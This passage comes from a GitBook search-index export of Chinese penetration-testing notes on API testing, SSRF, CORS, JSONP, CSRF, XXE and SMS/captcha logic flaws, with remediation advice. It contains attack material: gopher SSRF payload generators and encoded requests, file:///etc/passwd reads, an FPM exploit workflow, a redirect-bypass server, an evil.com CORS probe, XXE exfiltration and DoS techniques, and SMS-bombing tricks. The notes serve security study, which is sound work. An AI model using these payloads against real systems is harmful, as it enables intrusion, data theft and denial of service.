"},"01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html":{"url":"01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html","title":"01.前置知识","keywords":"","body":"Jquery WebPack TIP：很多API接口文档都藏在二级，三级，四级甚至五级目录下（druid什么的也是），推荐使用burp被动扫描，扫描出来后可以使用工具或者手工进行接口测试 APIkit：不能使用原始请求头，只保留了Cookie，被动扫描不能关闭 Routevulscan：不能控制扫描层数，bypass有点问题 onescan：高度自定义，缺少bypass 我这里选择onescan+自定义bypass字典，然后可以用APIkit来测试接口 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 15:53:42 "},"01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html":{"url":"01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html","title":"03.Tips","keywords":"","body":"先进入后台界面，再弹出校验界面，可以尝试drop掉该校验数据包 求助对未授权的“登录过期，请重新登录”站点利用方式 - T00ls.Com 基本流程 收集接口 找一找泄漏的接口 泄漏的api文档，比如swagger接口文档 目标公司的开发者平台 SourceMap supersearchplus urlfinder HAE 收集完后，确定好BaseDir API接口测试工具 ReadyAPI packerfuzzer swagger-exp supersearchplus https://app.apifox.com/ 常见测试点 鉴权相关 未授权访问 水平/垂直越权 鉴权数据缺陷，如JWT 常见测试接口 upload 用户查询接口，带参数page，size的 download login sql注入 后端组件漏洞：如fastjson，log4j 响应数据包信息泄漏：敏感信息，组件版本号，参数泄漏 接口FUZZ 通过已知的接口，猜测未知接口 如看到imageUpload可以试试fileUpload，encryptlist→list ​ 借助AI生成符合命名规律的接口名称进行FUZZ 接口参数爆破 响应包中返回缺失什么参数，只能接受哪种content-type（content-type也可以爆破） 其他案例 /api/users/current/profile/email 在开发者经常会用current和me这种关键字,可以尝试利用用户id(数字)来替代current # 将current变为不同用户的id /api/users/1234/profile/email 前端API服务器处理该请求时，会解析允许请求通过的“current”关键字，并将其转发给后端API服务器,当后端 API 收到请求时 /api/users/current/profile/email → /api/users/1234/profile/email 越权测试 /api/users/current/../1235/profile/email Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:20:03 "},"01.渗透测试/02.Web安全/07.SSRF/SSRF.html":{"url":"01.渗透测试/02.Web安全/07.SSRF/SSRF.html","title":"SSRF","keywords":"","body":"漏洞原理 SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。 漏洞危害 内网主机，端口，服务等信息收集 file协议读取本地文件 攻击内网的应用程序及服务 常见场景 下载图片、下载文件等下载处； 文件预览、图片预览等获取图片、文件内容处； 在线识图，在线文档翻译，分享，订阅等； 根据远程URL上传，静态资源图片等； 数据库的内置功能，比如mongodb的copyDatabase函数； URL关键字中，比如：source，share，link，src，imageurl，target等； From 国光师傅的ssrf靶场拓扑图 172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。 漏洞利用 检测到存在SSRF漏洞后 探测主机存活情况 探测存活主机端口情况 根据端口情况尝试攻击 注意点 攻击的数据需要经过两次URL编码，因为数据是先到达有SSRF漏洞的主机，再通过SSRF漏洞转交给内网其他主机处理。 常用协议介绍 curl cURL是一个利用URL语法在命令行下工作的文件传输工具。 它的名字就是客户端（client）的 URL 工具的意思。 curl -v www.baidu.com -v：显示请求头和响应头 curl -V 可以看到支持的协议如下 dict file ftp pop3 pop3s ftos gopher gophers rtmp rtsp http https imap scp sftp imaps ldap ldaps smb smbs smtp smtps telnet tftp mtt gopher gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，支持发出GET、POST请求，可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。 坑点 ┌──(khaz㉿kali)-[~/桌面] └─$ curl gopher://localhost:2222/khaz%0atest%0ahaha ┌──(khaz㉿kali)-[~/桌面] └─$ nc -lvp 2222 listening on [any] 2222 ... connect to [127.0.0.1] from localhost [127.0.0.1] 50546 haz test haha 会发现接收到的消息是分行的，而且第一行只接收到了haz，k被‘吃掉’了。 所以在使用gopher协议时需要在url后加入一个任意字符才行。 get/post请求 1、构造HTTP数据包 2、URL编码、替换回车换行为%0d%0a, 3、发送gopher协议 注意HTTP数据包中必须要有下面四个请求头 POST /1.php HTTP/1.1 Host: 192.168.244.128 Content-Type: application/x-www-form-urlencoded Content-Length: 6 a=khaz import urllib.parse #转换脚本 uri = '/flag.php' host = '127.0.0.1:80' content = 'key=90bb4d9d9946905d6d9d68358d7c0360' content_length = len(content) test =f\"\"\"POST {uri} HTTP/1.1 Host: {host} Content-Type: application/x-www-form-urlencoded Content-Length: {content_length} {content}\"\"\" first = urllib.parse.quote(test)#url编码 second = first.replace('%0A','%0D%0A')# \\n → \\r\\n third = urllib.parse.quote(second) payload = 'gopher://{}/_'.format(host)+third+\"%0D%0A\" #gopher协议会吃掉url后面的第一个字符 print(payload) 例子 通过命令发起 //1.php kali gopher://192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A 通过curl函数发起--两次url编码 //ssrf.php windows 直接用通过命令发起的payload（一次url编码），发现无回显 ?url=gopher://192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A 再次进行url编码后发送，发现是可以回显的。 ```php ?url=gopher%3A%2F%2F192.168.244.128%3A80%2F_POST%2520%2F1.php%2520HTTP%2F1.1%250D%250AHost%253A%2520192.168.244.128%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%25206%250D%250A%250D%250Aa%253Dkhaz%250D%250A ``` http/https 探测Web 应用的信息情况 file 读取本地文件 file:///etc/passwd file:///etc/hosts # 记录本机的或其他主机的ip及其对应主机名 # 高权限 file:///proc/net/arp # 记录ARP协议内容，里面有主机的ip和mac地址 file:///etc/network/interfaces # 大部分网络接口配置 dict 探测端口服务 https://blog.51cto.com/u_15127673/4130760 dict 协议是一个在线网络字典协议，用来架设字典服务的。 它是基于TCP协议开发的，所以像 mysql 的服务，因为也是基于 tcp 协议开发，所以用 dict 协议的方式打开能强行读取一些 mysql 服务的返回内容 >> PS D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test> D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.3.4nts/php.exe \"d:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\2.php\" J 5.7.26U'+I2J%mkwB\"M)7 Imysql_native_password!#08S01Got packets out of order 可以看到5.7.26和mysql ​ 利用案例 Fastcgi https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list https://www.freebuf.com/articles/web/263342.html FPM是什么 当我们的web服务器收到请求php文件的请求时，就让php-fpm把其解释(翻译)成html格式的文件(事实上php-fpm正是干这个事的)，然后我们的web服务器将翻译出来的.html文件发给浏览器。 而php-fpm能够进行翻译依靠的就是Fastcgi通信协议。 漏洞成因 PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。 fastcgi协议传输的数据其实就是PHP环境变量的一部分。 通过设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 使用条件 PHP服务器开启fastcgi的端口9000 能够找到PHP服务器上的php文件 利用 exp 监听端口：nc -lvp 9000>1.txt 使用exp：python fpm.py -c \"payload\" -p 9000 127.0.0.1 php文件路径 将生成的1.txt进行双url编码：python 1.py #1.py import urllib.parse f = open(r'1.txt','rb') s = f.read() s = urllib.parse.quote(s) s = urllib.parse.quote(s) print(\"gopher://127.0.0.1:9000/_\"+s) 利用得到的结果进行攻击 redis resp协议，换行分割/x0a/x0d gopher协议可以构造数据包 weblogic的CRLF注入 ssrf与gopher与redis - sijidou - 博客园 (cnblogs.com) weblogic从ssrf到redis获取shell - qianxinggz - 博客园 (cnblogs.com) mysql https://paper.seebug.org/510/ bypass IP地址变形绕过IP过滤不当 Demo 绕过：IP地址变形 IP地址的数字形式 ip地址省略形式 可以省略ip地址中间的0，如127.1 == 127.0.0.1 本地地址127.0.0.1等价 127。0。0。1 [::1] # IPV6 localhost 127.233.233.233 Linux下127.0.0.1与0.0.0.0指向同一个地址 URI解析不当绕过 http://baidu.com@khaz.top => http://khaz.top 只解析最后一个@后面的域名 http://khaz.top#baidu.com => http://khaz.top 总结 重定向绕过协议限制 python脚本 from flask import Flask, request, redirect app = Flask(__name__) @app.route('/') def redirect_request(): # 从请求参数中获取 ip, port, scheme, data，如果缺失则置为空字符串 ip = request.args.get('ip', '') port = request.args.get('port', '') scheme = request.args.get('s', '') data = request.args.get('data', '') # 构造重定向的 URL if scheme == 'file': redirect_url = f\"{scheme}://{data}\" else: redirect_url = f\"{scheme}://{ip}:{port}/{data}\" print(redirect_url) # 返回重定向响应 return redirect(redirect_url) if __name__ == '__main__': # 启动 Flask 应用，绑定到 0.0.0.0 和端口 8888 app.run(host='0.0.0.0', port=8888, debug=True) 302.php DNS Rebinding绕过不恰当的域名解析验证 知道创宇在线 http://ceye.io/dns-rebinding 同一个域名绑定两条A记录。这样解析是随机的。 自己的服务器： 需要多试几次，碰运气。 当服务器第一次解析出来是个外网ip，第二次解析出来是个内网ip的时候攻击就成功了 自建 https://xz.aliyun.com/t/7495#toc-6 url中的unicode欺骗 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 漏洞修复 禁止重定向跳转 设置URL白名单（限制可以访问的URL） 禁止不需要的协议 限制端口 鉴权，如cookie，jwt等，当攻击者只能控制一个url时，而无法添加这些请求头时，就无法访问某些接口 校验了其他http header字段时，如referer，UA等 参考文章 https://www.wangan.com/articles/1238#59315b https://zhuanlan.zhihu.com/p/112055947 https://joychou.org/web/phpssrf.html#directory0811578052187574410 https://www.sqlsec.com/2021/05/ssrf.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 15:42:21 "},"01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html":{"url":"01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html","title":"CORS","keywords":"","body":"前置知识 CORS（Cross-Origin Resource Sharing）是一种跨域资源共享机制，它允许Web应用程序从不同的域名访问资源，而不受同源策略的限制。CORS机制需要在服务端进行配置，并且需要在每个跨域请求中添加特定的HTTP头部信息，例如“Access-Control-Allow-Origin”和“Access-Control-Allow-Methods”等。CORS机制可以支持各种类型的HTTP请求，包括GET、POST、PUT、DELETE等，因此它在Web应用程序中的应用非常广泛。 客户端--CORS简单请求 符合以下条件的为简单请求 请求方法为get，post，head中的一种 header头为以下字段的子集 Accept Accept-language Content-language Last-Event-ID Content-Type:application/x-www-form-urlencoded,multipart/form-data,text/plain 客户端--CORS非简单请求（不符合简单请求的条件时） 客户端非简单请求流程 第一次请求为预检请求（OPTIONS方法，Origin请求头） 根据服务器返回的response来判断是否能够发起CORS请求 服务端配置 相关的头部字段含义 Access-Control-Allow-Origin: 必需项，告诉浏览器允许该源访问资源。 Access-Control-Allow-Headers: 必需项，指明了实际请求中允许携带的标头字段。 Access-Control-Allow-Methods: 可选项，指定了访问资源时允许使用的请求方法 Access-Control-Allow-Credentials:表示是否允许发送cookie，默认不允许。设置为true时，可以发送cookie Nginx配置Demo location = /corstest.php { root /var/www/html; add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } …… } 代码配置Demo 服务端对于跨域请求的处理流程 错误的Access-Control-Allow-Origin配置 http://debug.io:90/cors_read.html var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1/cors.php', true); // If specified, responseType must be empty string or \"text\" xhr.responseType = 'text'; xhr.onload = function () { if (xhr.readyState === xhr.DONE) { if (xhr.status === 200) { document.write(xhr.responseText); } } }; xhr.send(null); http://127.0.0.1/cors.php name password Jack 1ui23p=13! 没有设置Access-Control-Allow-Origin 设置Access-Control-Allow-Origin为*时 设置Access-Control-Allow-Origin为test.com时 漏洞危害 cors如果配置不当，就可能导致攻击者通过恶意网站或代码执行跨域请求，从而获取或篡改用户的敏感数据（危害和CSRF类似，不过可以劫持返回的内容）。 漏洞原理 Java:https://mp.weixin.qq.com/s/PSU8T-IO3mAz4MEVvAeUug PHP:https://mp.weixin.qq.com/s/ViSR-l41Z9qsazxI2MAhTA POC 请求包加入 origin:http://evil.com 观察响应头 Access-Control-Allow-Origin: */null/http://evil.com Access-Control-Allow-Credentials: true 漏洞修复 限制Access-Control-Allow-origin 的值为可信源，尽可能设置白名单，不能为*，也不能为 null 避免 Access-Control-Allow-Credentials 的值为 True 设置 Access-Control-Allow-Methods5（允许的 HTTP 方法）、Access-Control-Allow-Headers(允许的请求头) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 23:46:45 "},"01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html":{"url":"01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html","title":"JSONP跨域漏洞","keywords":"","body":"前置知识 同源策略 目的 同源策略的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。 设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？ 很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。 由此可见，\"同源策略\"是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。 定义 两个web界面只有同协议，同域名，同端口才是同源的 jsonp JSONP（JSON with Padding）即填充式的JSON，通过填充额外的内容把JSON数据包装起来，变成一段有效的可以独立运行的JavaScript语句。它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。 下面通过Demo代码演示 假设http://debug.io:90/ 服务器存放JSON数据 //jsonp.php 那么http://localhost可以通过以下方式获取http://debug.io:90/上存放的JSON数据 script标签的src属性 function test(data) { alert(data.name); } ajax请求 $.getJSON(\"http://debug.io:90/jsonp.php?callback=?\", function(data){ alert(data.age); }); 漏洞原理 JSONP跨域漏洞是指网站JSONP接口callback参数值可自定义导致的XSS和JSONP劫持 漏洞利用 XSS 当Content-Type为text/html且未对callback参数进行过滤时出现 // 攻击者构造 http://api.example.com/data?callback=alert('xss') JSONP劫持 当网站的JSONP接口没有做好防护，并且存在敏感数据时，攻击者就可以构造恶意的html页面诱导受害者点击，从而携带用户的cookie等信息向jsonp接口发起请求，并通过callback将获取到的敏感数据发给攻击者。 http://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#Referer%E7%BB%95%E8%BF%87 利用手法 获取jsonp中的敏感信息 水坑攻击 水坑攻击就是在受害者必经之路设置一个水坑，也就是陷阱。攻击者通过分析受害者的上网活动规律，经常访问哪些网站，然后利用网站漏洞在其中植入攻击代码。比如攻击者通过分析得知受害者经常访问网站A和B，并想要得到受害者在网站A上的敏感数据，而网站B安全性相对薄弱，于是攻击者在网站B中植入JSONP利用代码，当受害者访问网站B时，就会通过JSONP跨域访问网站A从而获取受害者在网站A上的敏感数据。 蜜罐溯源 蜜罐能够对攻击者画像进行画像和溯源的原理就是蜜罐中集成了大量社交网站的JSONP接口。当攻击者发起攻击时，如果其使用的浏览器保存了社交网站的登录信息，就有可能因为触发了蜜罐的JSONP利用代码而留下个人社交信息。 漏洞修复 对请求的来源进行校验，如Referer，Origin等参数 尽量不使用JSONP接口来传输敏感数据 使用CORS来代替JSONP 二者区别 JSONP是浏览器默认支持的跨域方式（跨域加载javascript），CORS是W3C提供的一个跨域标准 JSONP只支持GET方法，CORS可以自定义支持的方法 JSONP几乎支持所有的浏览器，CORS不支持IE10下的浏览器 JSONP传递的数据要符合JavaScript代码规范，CORS可以是html，xml等多种格式 参考文章 《Web漏洞解析与攻防实战》 JSONP挖掘与高级利用 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-23 16:21:29 "},"01.渗透测试/02.Web安全/09.CSRF/CSRF.html":{"url":"01.渗透测试/02.Web安全/09.CSRF/CSRF.html","title":"CSRF","keywords":"","body":"漏洞原理 CSRF（Cross-site request forgery）跨站请求伪造攻击：攻击者通过一些技术手段欺骗用户的浏览器去访问一个用户自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。 简单来说就是你点击我构造的恶意链接，我就可以以你的名义（浏览器中存储的身份认证信息）去发起一个http请求 攻击者可以预先伪造用户的请求 伪造的请求可以使用存储的Cookie 漏洞危害 伪造用户请求，用户能做啥，这个漏洞就能做啥 常见场景 修改密码，修改个人信息，订单信息等 创建用户，发送邮件等 数据包无token和referer验证 无token验证并且无referer验证时，就基本存在跨站请求伪造，但基于功能点不同，一些为无意义无危害的跨站请求伪造。 提交数据包时抓包删除referer字段，如果不报错，则基本存在跨域请求伪造，GET型构造链接，POST型写一个提交表单，测试有跨域情况下提交的数据包是否生效。 数据包无token有referer验证 ​ 只有referer验证时，可尝试空referer或者尝试域名伪造。 POC GET POST burp右键生成 漏洞修复 当用户发送重要的请求时需要输入原始密码，手机验证码等 设置Token 检验 referer 来源 疑问：referer不是可以进行伪造吗？ 答：攻击者确实可以在发送请求时进行伪造，但是csrf是用户发起请求，用户不会去伪造； 不过当网站本身可以植入csrf的payload时，检验refer来源的防御手段就失效了。 设置SameSite ​ SameSite 是 HTTP Cookie 的一个属性，用于限制 Cookie 的发送范围，确保 Cookie 不会在跨站请求中被滥用 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 15:45:24 "},"01.渗透测试/02.Web安全/10.XXE/XXE.html":{"url":"01.渗透测试/02.Web安全/10.XXE/XXE.html","title":"XXE","keywords":"","body":"XML 基础 定义 XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。 与html的联系和区别 HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 对 XML 最好的描述是： XML 是独立于软件和硬件的信息传输工具。 语法 格式 XML声明：版本，编码信息（可选，如果存在就必须放在文档的首行） DTD:Document Type Definition 即文档类型定义 (可选) 文档元素 典型xml文档例子 ]> Tove Jani Reminder Don't forget me this weekend! &xxe; DTD与实体 DTD DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 ]> 上面所示的就是一个DTD ]> 上面所示的就是一个外部DTD 实体 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 ]> &hello 文档元素可以使用&来引用实体的值，&hello将被替换为hello world 参数实体 XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用 \"> %b; ]> 可以看到参数实体用% name声明，引用时用%name; 引入外部实体 ]> 这里使用了file协议来引入外部实体，实际上还能支持如下协议，这也是xxe漏洞形成的原因 XXE漏洞 概述 XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞 漏洞成因 XXE 漏洞发 生在应用程序解析 XML 输入时，没有禁止外部实体的加载，而外部实体的引用可支持http，file等协议，通过利用这些协议进行攻击。 漏洞场景 黑盒 content-type测试 数据包中的content-type application/xml text/xml http body 数据包请求头中Context-Type的值为application/json，更改为application/xml或者text/xml，观察响应包是否会解析xml，比如返回的报错信息中显示后端有处理xml的组件，然后插入payload测试 ​ xlsx，svg等文件上传功能点 利用EXCEL进行XXE攻击 解压xlsx文件，在[Content_Types].xml中插入payload 然后再重新打包为1.xlsx # 也可以尝试在如下xml文件中插入payload xl/workbook.xml xl/worksheets/sheet1.xml _rels/.rels xl/_rels/workbook.xml.rels xl/theme/theme1.xml _rels/.rels docProps/app.xml docProps/core.xml xl/_rels/workbook.xml.rels xl/styles.xml xl/workbook.xml 上传svg，docx等xml格式的文件进行攻击 1.svg ]> &file; java--jar协议解压压缩包 白盒相关函数 php simplexml_import_dom() 需要注意的是PHP是使用libxml来解析XML的，但是libxml2.9.0开始就默认不解析外部实体，自然就不存在xxe漏洞。 java javax.xml.parsers.DocumentBuilder javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester 漏洞危害 文件读取 内网探针 拒绝服务攻击 命令执行 漏洞利用 实验环境 https://github.com/c0ny1/xxe-lab php版本 vulhub Apache solr XML 实体注入漏洞（CVE-2017-12629） 有回显 Demo libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); try{ $dom = new DOMDocument(); $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds->username; $password = $creds->password; if($username == $USERNAME && $password == $PASSWORD){ $result = sprintf(\"%d%s\",1,$username); }else{ $result = sprintf(\"%d%s\",0,$username); } }catch(Exception $e){ $result = sprintf(\"%d%s\",3,$e->getMessage()); } username为回显位 payload ]> &xxe; 无回显 外带 php://filter读取对方服务器文件内容→引入外部实体（攻击服务器上的）→触发外部实体中的写入代码，将读取到的文件内容赋值给指定参数→接收参数，在攻击服务器监听或者查看日志，从而获取到对方服务器文件内容 %dtd; %send; ]> \" > %payload; 注意：test.dtd的内容，内部的%号要进行实体编码成&#x25（因为实体的值中不能有 %, 所以将其转成html实体编码 %） 基于报错 构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。 引入服务器实体 %xxe; ]> xml.dtd \"> %eval; %error; 引入本地系统文件--测试失败 https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/ Your DTD code %local_dtd; ]> DTD code \"> &#x25;eval; &#x25;error; payload \"> &#x25;eval; &#x25;error; %local_dtd; ]> 嵌套参数实体 \"> &#x25;para2; '> %para; ]> 不是所有的xml解析器都能解析嵌套参数实体 利用方式 文件读取 ]> ]> &rabbit; 当不能使用过滤器时 \"> %dtd; ]> evil.dtd POST数据 &all; 列目录--JAVA ]> &xxe; ]> &xxe; 内网探测 ]> &rabbit; 命令执行 该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令 ]> &xxe; DOS攻击--没成功过 ]> &lol9; 此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 亦或者，如果目标是UNIX系统， ]> &xxe; 如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。 绕过 插入空格 可以在或后插入任意数量的空格 编码绕过 UTF-7 UTF-16 BE，UTF-16 LE UTF-32 BE、UTF-32LE、UTF-322143、UTF-323412 EBCDIC cat payload.xml | iconv -f utf-8 -t utf-7 > payload.7.xml 工具 7.XXEinjector：一款功能强大的自动化XXE注射工具 - bmjoker - 博客园 (cnblogs.com) 漏洞修复 禁用外部实体 PHP: libxml_disable_entity_loader(true); JAVA: // SAXBuilder SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); // DocumentBuilder DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); DocumentBuilder documentBuilder = dbf.newDocumentBuilder(); // SAXReader SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); // SAXTransformerFactory SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // TransformerFactory TransformerFactory tf = TransformerFactory.newInstance(); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // Unmarshaller 默认方法不存在xxe漏洞 Python： from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的 XML 数据 如过滤关键词： 参考文章 https://xz.aliyun.com/t/3357 https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93 https://www.cnblogs.com/20175211lyz/p/11413335.html https://xz.aliyun.com/t/6829#toc-4 补充：https://tttang.com/archive/1813/#toc__2 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 15:45:43 "},"01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html":{"url":"01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html","title":"01.短信验证码与图形验证码","keywords":"","body":"一般校验过程 短信验证码 短信轰炸 绕过方法 # 手机号 添加区号如+86 手机号前后添加空格 多手机号参数：mobile=xx&mobile=xx 添加逗号：mobile=xxx,xxx 手机号长度 Fuzz（位置手机号前，后，前后） # 不同接口 type参数 # 突破验证码发送次数限制 修改请求包UA,IP 时间戳绕过：数据包返回time参数，后端通过校验时间戳来判断是否能再次发送短信 # 验证码短信内容可控 Trubo Intruder的%s回显 验证码由客户端发送 短信验证码校验绕过 # 验证码可暴力破解 通常短信验证码有效期为1min，只能爆4位的，可以看看发送的验证码长度是否可控参数有两个比如mobile=xxx&code=6，这个code=6代表验证码长度 短信验证码存在默认值：所有手机号均存在默认短信验证码（没碰到过）或者只有测试手机号存在默认短信验证码（碰到过） # 验证码可获得 服务端回显:响应包中回显短信验证码 短信接收方可篡改：可修改请求包中的手机号控制验证码的发送 修改手机号发给攻击者 发送给多个手机号并且收到的验证码是相同的比如phone=phone1,phone2 # 绑定关系失效 验证码未与手机号进行绑定 短信接收方可篡改：用phone2接受的验证码校验phone1 最终提交时存在两个手机号参数：一个用于验证短信验证码，一个用于注册/登录，后端没有对这两个参数做一致性校验，达到的效果就是用自己的手机号接受验证码来注册他人的手机号 # 验证码验证机制失效 万能验证码：将验证码置空，删除，置null时后端不对验证码进行校验 验证码可复用：验证码的有效期过长，并且在使用后仍可以再次使用或者在一定时间内发送的短信都是相同的 （修复建议：当服务器端处理完一次用户提交的请求之后,及时将 session域中的验证码清除,并生成新的验证码。） 图形验证码 盘点图形验证码的漏洞挖掘方式，看完之后你还不会挖吗？ 图形验证码识别 captcha-killer-modified/FAQ.md at main · f0ng/captcha-killer-modified 【Security】利用Burp Suite爆破带有验证码Web登录接口（保姆级教程） - 为极客而生 - 博客园 regex：\"token\":\"(.*?)\" [*] use @captcha@ replace captcha [*] use @captcha-killer-modified@ replace captcha's token 图形验证码复用 